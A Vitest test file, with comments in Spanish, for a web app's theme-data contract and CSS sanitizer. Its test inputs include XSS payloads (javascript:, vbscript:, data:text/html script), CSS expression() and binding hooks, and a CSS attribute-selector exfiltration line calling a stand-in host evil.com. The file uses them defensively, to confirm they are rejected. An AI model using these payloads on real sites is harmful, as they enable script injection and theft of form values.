import { describe, it, expect } from 'vitest'
import {
  sanitizeThemeData,
  assertNoDatabaseLeak,
  isValidCssColor,
  isSafeAssetUrl,
  freezeThemeData,
} from './theme-contract'
import { sanitizeThemeCss } from './css-sanitizer'

describe('Theme Security Contract & Isolation', () => {
  it('valida colores CSS seguros y rechaza entradas peligrosas', () => {
    expect(isValidCssColor('#474747')).toBe(true)
    expect(isValidCssColor('#D6F391')).toBe(true)
    expect(isValidCssColor('rgb(255, 255, 255)')).toBe(true)
    expect(isValidCssColor('hsl(120, 100%, 50%)')).toBe(true)
    expect(isValidCssColor('transparent')).toBe(true)

    // Entradas peligrosas / inválidas
    expect(isValidCssColor('javascript:alert(1)')).toBe(false)
    expect(isValidCssColor('expression(alert(1))')).toBe(false)
    expect(isValidCssColor('<script>')).toBe(false)
  })

  it('valida URLs de assets cosméticos y rechaza esquemas peligrosos', () => {
    expect(isSafeAssetUrl('https://example.com/logo.png')).toBe(true)
    expect(isSafeAssetUrl('/logos/brand.svg')).toBe(true)
    expect(isSafeAssetUrl('data:image/png;base64,iVBORw0KGgo=')).toBe(true)

    // Esquemas peligrosos
    expect(isSafeAssetUrl('javascript:alert(document.cookie)')).toBe(false)
    expect(isSafeAssetUrl('data:text/html,<script>alert(1)</script>')).toBe(false)
    expect(isSafeAssetUrl('vbscript:msgbox(1)')).toBe(false)
  })

  it('sanitizeThemeData purga absolutamente cualquier propiedad de base de datos', () => {
    const rawDataConFugaDeBD = {
      nombreMarca: '  Empresa Circular  ',
      logotipoUrl: 'https://example.com/logo.png',
      // Datos de base de datos que NUNCA deben pasar:
      id: 'uuid-1234-5678',
      user_id: 'user-sensitive-id',
      empresa_id: 'empresa-secret-id',
      email: 'admin@empresa.com',
      telefono: '+57 300 1234567',
      password: 'hashed_password_xyz',
      token: 'jwt_token_secret',
      crm_clientes: [{ id: '1', nombre: 'Cliente VIP' }],
      total: 5000000,
      tokens: {
        colorPrimario: '#00827C',
        colorFondo: '#FFFFFF',
        colorTexto: '#474747',
        // Inyección maliciosa en tokens
        secret_token: 'secret',
      },
    }

    const seguro = sanitizeThemeData(rawDataConFugaDeBD)

    expect(seguro.nombreMarca).toBe('Empresa Circular')
    expect(seguro.logotipoUrl).toBe('https://example.com/logo.png')
    expect(seguro.tokens.colorPrimario).toBe('#00827C')

    // Verificar que los datos sensibles de base de datos NO existen
    const seguroRec = seguro as unknown as Record<string, unknown>
    const tokensRec = seguro.tokens as unknown as Record<string, unknown>
    expect(seguroRec.id).toBeUndefined()
    expect(seguroRec.user_id).toBeUndefined()
    expect(seguroRec.empresa_id).toBeUndefined()
    expect(seguroRec.email).toBeUndefined()
    expect(seguroRec.telefono).toBeUndefined()
    expect(seguroRec.password).toBeUndefined()
    expect(seguroRec.token).toBeUndefined()
    expect(seguroRec.crm_clientes).toBeUndefined()
    expect(seguroRec.total).toBeUndefined()
    expect(tokensRec.secret_token).toBeUndefined()
  })

  it('assertNoDatabaseLeak arroja una excepción si detecta campos de base de datos', () => {
    const objetoPeligroso = {
      nombre: 'Tema 1',
      crm_clientes: [{ nombre: 'Juan' }],
    }

    expect(() => assertNoDatabaseLeak(objetoPeligroso)).toThrowError(/ThemeSecurityViolation/)
  })

  it('assertNoDatabaseLeak pasa silenciosamente para objetos limpios', () => {
    const objetoLimpio = {
      nombreMarca: 'Marca',
      tokens: { colorPrimario: '#474747' },
    }

    expect(() => assertNoDatabaseLeak(objetoLimpio)).not.toThrow()
  })

  it('freezeThemeData previene mutaciones en tiempo de ejecución', () => {
    const datos = freezeThemeData({
      marca: 'Test',
      nested: { color: '#000' },
    })

    expect(Object.isFrozen(datos)).toBe(true)
    expect(Object.isFrozen(datos.nested)).toBe(true)
  })
})

describe('CSS Sanitizer & Anti-Exfiltration Guard', () => {
  it('elimina declaraciones @import externas', () => {
    const css = `@import url('https://evil.com/malicious.css');
    body { background: #fff; }`
    const sanitized = sanitizeThemeCss(css)

    expect(sanitized).not.toContain('@import')
    expect(sanitized).toContain('body { background: #fff; }')
  })

  it('bloquea selectores de atributos diseñados para exfiltrar datos de inputs', () => {
    const css = `
    input[value^="admin"] { background: url('https://evil.com/leak?q=admin'); }
    input[data-token] { color: red; }
    h1 { color: blue; }`
    const sanitized = sanitizeThemeCss(css)

    expect(sanitized).not.toContain('input[value')
    expect(sanitized).not.toContain('input[data-token')
    expect(sanitized).toContain('h1 { color: blue; }')
  })

  it('elimina expresiones y bindings peligrosos de CSS', () => {
    const css = `
    div {
      width: expression(alert(1));
      -moz-binding: url('xbl.xml#hack');
      behavior: url('script.htc');
    }`
    const sanitized = sanitizeThemeCss(css)

    expect(sanitized).not.toContain('expression(')
    expect(sanitized).not.toContain('-moz-binding')
    expect(sanitized).not.toContain('behavior:')
  })

  it('bloquea URLs hacia dominios no autorizados en url(...)', () => {
    const css = `
    .bg { background-image: url('https://attacker-stealer.com/track.png'); }
    .safe { background-image: url('/logos/logo.png'); }`
    const sanitized = sanitizeThemeCss(css)

    expect(sanitized).not.toContain('https://attacker-stealer.com')
    expect(sanitized).toContain('/logos/logo.png')
  })
})
